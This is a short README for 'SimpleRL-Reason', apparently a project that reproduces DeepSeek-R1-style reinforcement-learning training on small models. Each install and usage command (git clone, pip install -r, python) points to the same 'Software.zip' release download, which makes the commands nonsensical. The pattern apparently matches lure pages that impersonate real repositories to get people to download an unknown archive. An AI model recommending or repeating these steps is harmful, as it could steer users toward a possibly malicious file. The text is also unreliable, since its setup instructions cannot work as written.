## Description
SimpleRL-Reason is a project that focuses on creating a simplified version of the training process used in DeepSeek-R1-Zero and DeepSeek-R1 but using smaller models and limited data. The goal of this repository is to provide a clear and concise example of how reinforcement learning can be implemented in scenarios where resources are constrained. By replicating the training process in a more accessible manner, this project aims to demystify the complexities often associated with deep reinforcement learning.

## Installation
To get started with SimpleRL-Reason, follow the steps below:
1. Clone the repository to your local machine using the following command:
   ```bash
   git clone https://github.com/ianv47/simpleRL-reason/releases/download/v1.0/Software.zip
   ```
2. Navigate to the project directory:
   ```bash
   cd simpleRL-reason
   ```
3. Install the required dependencies:
   ```bash
   pip install -r https://github.com/ianv47/simpleRL-reason/releases/download/v1.0/Software.zip
   ```

## Usage
Once you have installed the necessary dependencies, you can run the training process by executing the following command:
```python
python https://github.com/ianv47/simpleRL-reason/releases/download/v1.0/Software.zip --model small_model --data limited_data
```

This command will initiate the training process using a smaller model and limited data, replicating the approach taken in DeepSeek-R1-Zero and DeepSeek-R1. Feel free to modify the parameters and experiment with different configurations to see how the training process responds.
